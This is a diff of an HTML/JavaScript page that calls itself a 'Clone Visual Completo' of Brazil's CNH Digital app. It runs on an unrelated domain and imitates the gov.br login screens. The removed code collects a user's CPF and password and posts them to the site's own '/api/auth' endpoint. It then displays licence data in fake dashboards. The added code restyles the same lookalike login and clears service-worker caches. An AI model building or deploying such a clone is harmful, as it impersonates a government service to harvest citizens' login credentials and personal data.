@@ -1,930 +1,487 @@
 <!DOCTYPE html>
 <html lang="pt-br">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>CNH Digital</title>
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="default">
-  <meta name="apple-mobile-web-app-title" content="CNH Digital">
-  <link rel="manifest" href="manifest.json">
-  <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700;800&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>CNH Digital</title>
 
-    body {
-      font-family: 'Raleway', 'Rawline', sans-serif;
-      background-color: #000;
-      height: 100dvh;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+    <script>
+        (function () {
+            try {
+                if (window.location.search.includes('cleared=true')) return;
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.getRegistrations().then(function (registrations) {
+                        if (registrations.length > 0) {
+                            for (let registration of registrations) {
+                                registration.unregister();
+                            }
+                            if ('caches' in window) {
+                                caches.keys().then(function (names) {
+                                    for (let name of names) caches.delete(name);
+                                });
+                            }
+                        }
+                    });
+                }
+            } catch (e) { console.error("Erro ao limpar cache:", e); }
+        })();
+    </script>
 
-    #app {
-      width: 100%;
-      height: 100dvh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #000;
-    }
+    <link rel="manifest" href="manifest.json">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="CNH Digital">
+    <link rel="apple-touch-icon" href="icon-192.png">
+    <meta name="theme-color" content="#ffffff">
 
-    #tela-capa {
-      width: 100%;
-      max-width: 450px;
-      height: 100%;
-      background-color: #fff;
-      position: relative;
-      display: flex;
-      flex-direction: column;
-    }
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@300;400;600;700&family=Raleway:wght@400;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-    .capa-area {
-      height: 70%;
-      width: 100%;
-      background-image: url('img/capa_cnh.png');
-      background-size: cover;
-      background-position: center top;
-      position: relative;
-      flex-shrink: 0;
-    }
+    <style>
+        /* --- RESET GLOBAL --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
 
-    .capa-area::after {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 40%;
-      background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);
-    }
+        body {
+            font-family: 'Raleway', 'Rawline', sans-serif;
+            background-color: #000;
+            height: 100dvh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-    .conteudo-branco {
-      flex: 1;
-      background-color: white;
-      border-top-left-radius: 25px;
-      border-top-right-radius: 25px;
-      margin-top: -25px;
-      position: relative;
-      z-index: 10;
-      padding: 15px 30px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 15px;
-    }
+        /* --- ESTILOS DA TELA 1: CAPA --- */
+        #tela-capa {
+            width: 100%;
+            max-width: 450px;
+            height: 100%;
+            background-color: #fff;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
 
-    .logo-container img {
-      max-width: 140px;
-      display: block;
-      margin-bottom: 5px;
-    }
+        .capa-area {
+            height: 70%;
+            width: 100%;
+            background-image: url('img/capa_cnh.png');
+            background-size: cover;
+            background-position: center top;
+            position: relative;
+            flex-shrink: 0;
+        }
 
-    .termos-texto {
-      text-align: center;
-      font-size: 12px;
-      color: #333;
-      line-height: 1.3;
-      margin-bottom: 5px;
-    }
+        .capa-area::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 40%;
+            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);
+        }
 
-    .termos-texto a {
-      color: #1351b4;
-      text-decoration: underline;
-      font-weight: 600;
-    }
+        .conteudo-branco {
+            flex: 1;
+            background-color: white;
+            border-top-left-radius: 25px;
+            border-top-right-radius: 25px;
+            margin-top: -25px;
+            position: relative;
+            z-index: 10;
+            padding: 15px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
 
-    .btn-gov {
-      background-color: #1351b4;
-      color: white;
-      width: 100%;
-      padding: 14px 0;
-      border-radius: 50px;
-      border: none;
-      font-size: 14px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
-      text-transform: uppercase;
-    }
+        .logo-container img {
+            max-width: 140px;
+            display: block;
+            margin-bottom: 5px;
+        }
 
-    @media (min-height: 800px) {
-      .conteudo-branco {
-        justify-content: flex-end;
-        padding-bottom: 40px;
-        gap: 20px;
-      }
-    }
-  </style>
+        .termos-texto {
+            text-align: center;
+            font-size: 12px;
+            color: #333;
+            line-height: 1.3;
+            margin-bottom: 5px;
+        }
+
+        .termos-texto a {
+            color: #1351b4;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .btn-gov {
+            background-color: #1351b4;
+            color: white;
+            width: 100%;
+            padding: 14px 0;
+            border-radius: 50px;
+            border: none;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
+            text-transform: uppercase;
+        }
+
+        @media (min-height: 800px) {
+            .conteudo-branco {
+                justify-content: flex-end;
+                padding-bottom: 40px;
+                gap: 20px;
+            }
+        }
+
+        /* --- ESTILOS DA TELA 2: LOGIN --- */
+        #tela-login {
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            background-color: #f6f6f6;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        .header {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 16px 20px;
+            width: 100%;
+            background-color: #fff;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.16);
+        }
+
+        .logo-gov-login {
+            width: 100px;
+        }
+
+        .login-card {
+            width: calc(100% - 40px);
+            background-color: #fff;
+            padding: 24px 16px 22px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16);
+            box-sizing: border-box;
+        }
+
+        .title {
+            font-weight: 600;
+            font-size: 18px;
+            color: #000000;
+            margin-bottom: 20px;
+            width: 100%;
+            text-align: left;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            width: 100%;
+            color: #333;
+        }
+
+        .subtitle i {
+            color: #1351b4;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            width: 100%;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .label {
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .input-field:focus {
+            border-color: #d84800;
+            box-shadow: 0 0 0 1px #d84800 inset;
+            background-color: #ffee0169;
+        }
+
+        .alert-error {
+            background-color: #fbf5d0;
+            border: 1px solid #e5c22d;
+            border-radius: 4px;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            display: none;
+            align-items: center;
+            font-size: 14px;
+            color: #000;
+            font-weight: 500;
+            width: 100%;
+        }
+
+        .alert-error i {
+            font-size: 18px;
+            margin-right: 12px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background-color: #1351b4;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            min-width: 0;
+        }
+
+        .options-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+            width: 100%;
+            color: #333;
+        }
+
+        .option-btn {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            padding: 12px 15px;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            margin-bottom: 10px;
+            color: #1351b4;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            min-width: 0;
+        }
+
+        .option-btn i {
+            margin-right: 10px;
+            font-size: 16px;
+            width: 20px;
+            text-align: center;
+            flex: 0 0 20px;
+        }
+
+        .selo {
+            background-color: #008f43;
+            color: white;
+            font-size: 8px;
+            line-height: 1;
+            padding: 3px 5px;
+            border-radius: 4px;
+            margin-left: auto;
+            white-space: nowrap;
+            flex: 0 0 auto;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            padding-bottom: 20px;
+        }
+
+        @media (min-width: 768px) {
+            #tela-login .title {
+                font-size: 14.4px;
+            }
+
+            #tela-login .subtitle,
+            #tela-login .input-field,
+            #tela-login .btn-primary {
+                font-size: 12.8px;
+            }
+
+            #tela-login .description,
+            #tela-login .label,
+            #tela-login .alert-error,
+            #tela-login .options-title,
+            #tela-login .option-btn {
+                font-size: 11.2px;
+            }
+
+            #tela-login .option-btn i {
+                font-size: 12.8px;
+            }
+
+            #tela-login .selo {
+                font-size: 7px;
+                padding: 3px 4px;
+            }
+
+            #tela-login .footer {
+                font-size: 9.6px;
+            }
+        }
+
+        div:where(.swal2-container) {
+            z-index: 99999 !important;
+            font-family: 'Raleway', sans-serif !important;
+        }
+    </style>
 </head>
+
 <body>
-<div id="app"></div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
-<script>
-// ============================================================
-// CNH DIGITAL - Clone Visual Completo
-// Domínio: carteira-digital-transito-vio.digital
-// Backend: DocMaster D1 via /api/auth
-// ============================================================
-(function() {
-  'use strict';
-
-  let userData = null;
-  let currentSlide = 0;
-  const TOTAL_SLIDES = 4;
-  const app = document.getElementById('app');
-
-  function vw(min, pref, max) {
-    return `clamp(${min}px, ${pref}vw, ${max}px)`;
-  }
-
-  function show(html) {
-    app.innerHTML = html;
-    app.scrollTop = 0;
-  }
-
-  // ============================================================
-  // TELA 1 - SPLASH
-  // ============================================================
-  function showSplash() {
-    show(`
-      <div id="tela-capa" class="app-container">
+    <div id="tela-capa" class="app-container">
         <div class="capa-area"></div>
         <div class="conteudo-branco">
-          <div class="logo-container">
-            <img src="img/logo_cnh.png" alt="CNH Digital">
-          </div>
-          <div style="width: 100%;">
-            <div class="termos-texto">
-              Ao entrar, você concorda com nosso <br>
-              <a href="#">Termo de Responsabilidade</a> e <br>
-              <a href="#">Política de Privacidade</a>
+            <div class="logo-container">
+                <img src="img/logo_cnh.png" alt="CNH Digital">
             </div>
-            <button class="btn-gov" onclick="showLoginCPF()">
-              ENTRAR COM gov.br
-            </button>
-          </div>
-        </div>
-      </div>
-    `);
-  }
-
-  // ============================================================
-  // TELA 2 - LOGIN CPF
-  // ============================================================
-  function showLoginCPF() {
-    show(`
-      <div style="font-family: 'Raleway', 'Rawline', sans-serif; background-color: #000; height: 100dvh; width: 100vw; overflow: hidden; display: flex; justify-content: center; align-items: center; margin: 0; padding: 0;">
-        <div class="tela-govbr" style="width: 100%; max-width: 450px; height: 100%; background-color: #f8fafc; display: flex; flex-direction: column; position: relative; overflow: hidden;">
-          <div class="header-govbr" style="background-color: white; padding: 16px 24px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center;">
-            <img src="img/logo.png" class="logo-gov-login" alt="gov.br" style="height: 32px;" onerror="this.src='/assets/govbr-logo.png'">
-          </div>
-          <div class="login-card" style="padding: 24px; flex: 1; display: flex; flex-direction: column; overflow-y: auto;">
-            <div class="title" style="font-size: 16px; font-weight: 700; color: #1e293b; margin-bottom: 12px;">Identifique-se no gov.br</div>
-            <div class="subtitle" style="font-size: 13px; color: #334155; font-weight: 600; display: flex; align-items: center; gap: 6px; margin-bottom: 8px;">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg> Número do CPF
-            </div>
-            <div class="description" style="font-size: 12px; color: #64748b; margin-bottom: 20px; line-height: 1.4;">
-              Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
-            </div>
-
-            <div class="input-group" style="margin-bottom: 16px;">
-              <label class="label" style="display: block; font-size: 12px; font-weight: 700; color: #1e293b; margin-bottom: 6px;">CPF</label>
-              <input
-                id="cpf-input"
-                type="tel"
-                class="input-field"
-                placeholder="Digite seu CPF"
-                maxlength="14"
-                inputmode="numeric"
-                autocomplete="off"
-                oninput="maskCPF(this)"
-                onkeydown="if(event.key==='Enter')btnContinuar()"
-                style="width: 100%; padding: 12px 14px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; outline: none; box-sizing: border-box; background: white;"
-              >
-            </div>
-
-            <div id="cpf-error" style="display:none; background:#fef2f2; border:1px solid #fecaca; border-radius:6px; padding:10px 12px; color:#1e293b; font-size:13px; font-weight:600; margin-bottom:12px; display:flex; align-items:center; gap:8px;">
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-              <span>CPF informado inválido. (ERL0000500)</span>
-            </div>
-
-            <button id="btn-continuar" class="btn-primary" onclick="btnContinuar()" style="background-color: #1351b4; color: white; width: 100%; padding: 12px 0; border-radius: 25px; border: none; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 8px; margin-bottom: 24px;">
-              Continuar
-            </button>
-
-            <div class="options-title" style="font-size: 12px; font-weight: 700; color: #475569; margin-bottom: 12px;">Outras opções de identificação:</div>
-            <div class="option-btn" style="display: flex; align-items: center; width: 100%; padding: 11px 14px; background: white; border: 1px solid #e2e8f0; border-radius: 25px; margin-bottom: 10px; color: #1351b4; font-weight: 600; font-size: 13px; cursor: pointer; box-sizing: border-box;">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:10px; flex-shrink:0;"><path d="M3 21h18M3 7v1a3 3 0 0 0 6 0V7m0 1a3 3 0 0 0 6 0V7m0 1a3 3 0 0 0 6 0V7H3M5 21V10.85M9 21V10.85M15 21V10.85M19 21V10.85M3 7l9-4 9 4"/></svg>
-              Login com seu banco
-              <span class="selo" style="background-color: #008f43; color: white; font-size: 8px; padding: 3px 6px; border-radius: 4px; margin-left: auto; white-space: nowrap; text-transform: uppercase; font-weight: 700;">SUA CONTA SERÁ PRATA</span>
-            </div>
-            <div class="option-btn" style="display: flex; align-items: center; width: 100%; padding: 11px 14px; background: white; border: 1px solid #e2e8f0; border-radius: 25px; margin-bottom: 10px; color: #1351b4; font-weight: 600; font-size: 13px; cursor: pointer; box-sizing: border-box;">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:10px; flex-shrink:0;"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
-              Login com QR code
-            </div>
-            <div class="option-btn" style="display: flex; align-items: center; width: 100%; padding: 11px 14px; background: white; border: 1px solid #e2e8f0; border-radius: 25px; margin-bottom: 10px; color: #1351b4; font-weight: 600; font-size: 13px; cursor: pointer; box-sizing: border-box;">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:10px; flex-shrink:0;"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
-              Seu aplicativo gov.br
-            </div>
-            <div class="option-btn" style="display: flex; align-items: center; width: 100%; padding: 11px 14px; background: white; border: 1px solid #e2e8f0; border-radius: 25px; margin-bottom: 10px; color: #1351b4; font-weight: 600; font-size: 13px; cursor: pointer; box-sizing: border-box;">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:10px; flex-shrink:0;"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z"/></svg>
-              Seu certificado digital em nuvem
-            </div>
-            <div class="footer-gov" style="margin-top: auto; text-align: center; font-size: 11px; color: #64748b; padding-top: 20px; padding-bottom: 16px;">
-              Ministério da Gestão e da Inovação em Serviços Públicos
-            </div>
-          </div>
-        </div>
-      </div>
-    `);
-    setTimeout(() => { const el = document.getElementById('cpf-input'); if(el) el.focus(); }, 100);
-  }
-
-  window.maskCPF = function(el) {
-    document.getElementById('cpf-error').style.display = 'none';
-    let v = el.value.replace(/\D/g, '').slice(0, 11);
-    if (v.length >= 10) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-    else if (v.length >= 7) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
-    else if (v.length >= 4) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
-    el.value = v;
-  };
-
-  window.btnContinuar = function() {
-    const cpfVal = document.getElementById('cpf-input').value;
-    const digits = cpfVal.replace(/\D/g, '');
-    if (digits.length < 11) {
-      document.getElementById('cpf-error').style.display = 'block';
-      return;
-    }
-    showLoginSenha(digits, cpfVal);
-  };
-
-  // ============================================================
-  // TELA 3 - LOGIN SENHA
-  // ============================================================
-  function showLoginSenha(cpfDigits, cpfFormatted) {
-    show(`
-      <div style="font-family: 'Raleway', 'Rawline', sans-serif; background-color: #000; height: 100dvh; width: 100vw; overflow: hidden; display: flex; justify-content: center; align-items: center; margin: 0; padding: 0;">
-        <div class="tela-govbr" style="width: 100%; max-width: 450px; height: 100%; background-color: #f8fafc; display: flex; flex-direction: column; position: relative; overflow: hidden;">
-          <div class="header-govbr" style="background-color: white; padding: 16px 24px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center;">
-            <img src="img/logo.png" class="logo-gov-login" alt="gov.br" style="height: 32px;" onerror="this.src='/assets/govbr-logo.png'">
-          </div>
-          <div class="login-card" style="padding: 24px; flex: 1; display: flex; flex-direction: column; overflow-y: auto;">
-            <div class="title" style="font-size: 16px; font-weight: 700; color: #1e293b; margin-bottom: 16px;">Digite sua senha</div>
-            <div style="margin-bottom: 16px;">
-              <div style="font-size: 12px; color: #64748b; font-weight: 600; text-transform: uppercase;">CPF</div>
-              <div style="font-size: 14px; font-weight: 700; color: #0f172a;">${cpfFormatted || cpfDigits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</div>
-            </div>
-            <div class="input-group" style="margin-bottom: 16px;">
-              <label class="label" style="display: block; font-size: 12px; font-weight: 700; color: #1e293b; margin-bottom: 6px;">Senha</label>
-              <div style="position: relative;">
-                <input
-                  id="senha-input"
-                  type="password"
-                  class="input-field"
-                  placeholder="Digite sua senha atual"
-                  style="width: 100%; padding: 12px 42px 12px 14px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; outline: none; box-sizing: border-box;"
-                  onkeydown="if(event.key==='Enter')doLogin('${cpfDigits}')"
-                >
-                <button type="button" onclick="toggleSenha()" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #64748b;">👁</button>
-              </div>
-              <a href="#" style="font-size: 12px; color: #1351b4; text-decoration: underline; display: inline-block; margin-top: 6px; font-weight: 500;">Esqueci minha senha</a>
-            </div>
-
-            <div id="senha-error" style="display:none; background:#fef2f2; border:1px solid #fecaca; border-radius:6px; padding:10px 12px; color:#dc2626; font-size:13px; font-weight:600; margin-bottom:12px;">
-              Senha incorreta. Tente novamente.
-            </div>
-
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px;">
-              <button type="button" onclick="showLoginCPF()" style="background-color: white; color: #1351b4; border: 1px solid #cbd5e1; padding: 12px 0; border-radius: 25px; font-size: 14px; font-weight: 700; cursor: pointer;">
-                Cancelar
-              </button>
-              <button id="btn-entrar" type="button" onclick="doLogin('${cpfDigits}')" style="background-color: #1351b4; color: white; border: none; padding: 12px 0; border-radius: 25px; font-size: 14px; font-weight: 700; cursor: pointer;">
-                Entrar
-              </button>
-            </div>
-
-            <div style="margin-top: 24px; text-align: center;">
-              <a href="#" style="font-size: 12px; color: #1351b4; text-decoration: underline; font-weight: 500;">Ficou com dúvidas?</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    `);
-    setTimeout(() => { const el = document.getElementById('senha-input'); if(el) el.focus(); }, 100);
-  }
-
-  window.toggleSenha = function() {
-    const el = document.getElementById('senha-input');
-    if (el) el.type = el.type === 'password' ? 'text' : 'password';
-  };
-
-  window.doLogin = async function(cpf) {
-    const senhaEl = document.getElementById('senha-input');
-    const errEl = document.getElementById('senha-error');
-    const btnEl = document.getElementById('btn-entrar');
-    if (!senhaEl) return;
-    const senha = senhaEl.value;
-    if (!senha) { errEl.textContent = 'Digite sua senha.'; errEl.style.display = 'block'; return; }
-    btnEl.textContent = 'Autenticando...';
-    btnEl.disabled = true;
-    errEl.style.display = 'none';
-    try {
-      const res = await fetch('/api/auth', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ cpf, senha })
-      });
-      const json = await res.json();
-      if (json.success && json.user) {
-        userData = json.user;
-        if (userData.ufEmissao) userData.ufEmissao = userData.ufEmissao.toUpperCase();
-        if (userData.uf) userData.uf = userData.uf.toUpperCase();
-        showDashboard();
-      } else {
-        errEl.textContent = json.message || 'CPF ou senha inválidos';
-        errEl.style.display = 'block';
-        btnEl.textContent = 'Entrar';
-        btnEl.disabled = false;
-      }
-    } catch (e) {
-      errEl.textContent = 'Erro de conexão. Tente novamente.';
-      errEl.style.display = 'block';
-      btnEl.textContent = 'Entrar';
-      btnEl.disabled = false;
-    }
-  };
-
-  // ============================================================
-  // TELA 4 - DASHBOARD
-  // ============================================================
-  function showDashboard() {
-    const firstName = (userData.nome || '').split(' ')[0];
-    show(`
-      <div style="min-height:100vh;min-height:100dvh;background:#f0f0f0;">
-        <div style="background:#1B2A4A;padding:16px;display:flex;align-items:center;justify-content:space-between;">
-          <div style="display:flex;align-items:center;gap:12px;">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3 6h18M3 12h18M3 18h18" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
-            <span style="color:#fff;font-size:18px;font-weight:700;">CNH do Brasil</span>
-          </div>
-          <div style="display:flex;align-items:center;gap:14px;">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9zM13.73 21a2 2 0 01-3.46 0" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            <div style="width:32px;height:32px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;">
-              <span style="color:#1B2A4A;font-size:14px;font-weight:700;">${firstName.charAt(0)}</span>
-            </div>
-          </div>
-        </div>
-        <div style="padding:16px;display:flex;flex-direction:column;gap:14px;max-width:600px;margin:0 auto;">
-          ${dashCard('CONDUTOR','Gerencie sua','habilitação','#168821','showCondutor()')}
-          ${dashCard('VEÍCULOS','Acesso ao','CRLV-e, venda digital','#FFCD07','')}
-          ${dashCard('INFRAÇÕES','Visualize e pague infrações','com até 40% de desconto','#1351B4','')}
-          ${dashCard('EDUCAÇÃO','Conheça nossas','campanhas e projetos','#2670E8','')}
-        </div>
-        <div style="padding:24px 16px;text-align:center;">
-          <img src="assets/footer_logos.png" alt="Logos" style="height:32px;opacity:0.9;" onerror="this.style.display='none'">
-        </div>
-      </div>
-    `);
-  }
-
-  function dashCard(title, desc1, desc2, color, onclick) {
-    const clickAttr = onclick ? `onclick="${onclick}"` : '';
-    return `
-      <div ${clickAttr} style="background:${color};border-radius:12px;padding:18px;cursor:${onclick?'pointer':'default'};position:relative;overflow:hidden;display:flex;align-items:center;justify-content:space-between;min-height:80px;">
-        <div style="position:absolute;top:0;right:0;width:60%;height:100%;opacity:0.15;">
-          <div style="position:absolute;top:-20%;right:10%;width:2px;height:140%;background:#fff;transform:rotate(25deg);"></div>
-          <div style="position:absolute;top:-20%;right:25%;width:2px;height:140%;background:#fff;transform:rotate(25deg);"></div>
-        </div>
-        <div style="position:relative;z-index:1;">
-          <h3 style="margin:0 0 4px;font-size:16px;font-weight:700;color:#fff;">${title}</h3>
-          <p style="margin:0;font-size:13px;color:rgba(255,255,255,0.9);">${desc1}<br><strong>${desc2}</strong></p>
-        </div>
-        <svg width="40" height="40" viewBox="0 0 48 48" fill="none" style="opacity:0.9;"><rect x="8" y="16" width="32" height="20" rx="4" stroke="white" stroke-width="2.5"/><circle cx="20" cy="26" r="4" stroke="white" stroke-width="2"/><path d="M30 22h6M30 26h6M30 30h4" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
-      </div>
-    `;
-  }
-
-  // ============================================================
-  // TELA 5 - CONDUTOR
-  // ============================================================
-  window.showCondutor = function() {
-    const u = userData;
-    const cpfMask = u.cpf ? '***.' + u.cpf.substring(4, 11) + '-**' : '';
-    const ufEmissao = (u.ufEmissao || u.uf || '').toUpperCase();
-    show(`
-      <div style="min-height:100vh;min-height:100dvh;background:#f0f0f0;">
-        <div style="background:#1B2A4A;padding:16px;display:flex;align-items:center;gap:12px;">
-          <button onclick="showDashboard()" style="background:none;border:none;cursor:pointer;padding:0;display:flex;">
-            <svg width="30" height="30" viewBox="0 0 30 30" fill="none"><circle cx="15" cy="15" r="13" stroke="white" stroke-width="2" fill="none"/><path d="M17 10L12 15L17 20" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          </button>
-          <span style="color:#fff;font-size:16px;font-weight:700;">CONDUTOR</span>
-        </div>
-        <div style="padding:16px;max-width:600px;margin:0 auto;">
-          <div style="background:#fff;border-radius:12px;padding:20px;box-shadow:0 1px 4px rgba(0,0,0,0.08);">
-            <h3 style="margin:0 0 16px;font-size:16px;color:#1B2A4A;font-weight:700;">${u.nome}</h3>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
-              ${cField('CPF', cpfMask)}
-              ${cField('Sexo', u.sexo === 'M' ? 'Masculino' : u.sexo === 'F' ? 'Feminino' : (u.sexo || '-'))}
-              ${cField('Categoria', u.categoria)}
-              ${cField('UF de Emissão', ufEmissao)}
-              ${cField('Data de Validade', fmtDate(u.validade))}
-              ${cField('Data de Emissão', fmtDate(u.emissao))}
-            </div>
-          </div>
-          <button onclick="showHabilitacao()" style="width:100%;margin-top:14px;padding:18px;background:#1351B4;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:space-between;">
-            <div style="display:flex;align-items:center;gap:10px;">
-              <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" stroke="white" stroke-width="2"/><circle cx="8" cy="12" r="2.5" stroke="white" stroke-width="1.5"/><path d="M14 9h5M14 12h5M14 15h3" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg>
-              <span>HABILITAÇÃO</span>
-            </div>
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
-          </button>
-          <button style="width:100%;margin-top:10px;padding:18px;background:#fff;color:#1351B4;border:2px solid #e0e0e0;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:space-between;">
-            <div style="display:flex;align-items:center;gap:10px;">
-              <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="#1351B4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="10" stroke="#1351B4" stroke-width="2"/></svg>
-              <span>CADASTRO POSITIVO</span>
-            </div>
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#1351B4" stroke-width="2" stroke-linecap="round"/></svg>
-          </button>
-        </div>
-      </div>
-    `);
-  };
-
-  function cField(label, value) {
-    return `<div>
-      <span style="font-size:10px;color:#888;text-transform:uppercase;letter-spacing:0.5px;">${label}</span>
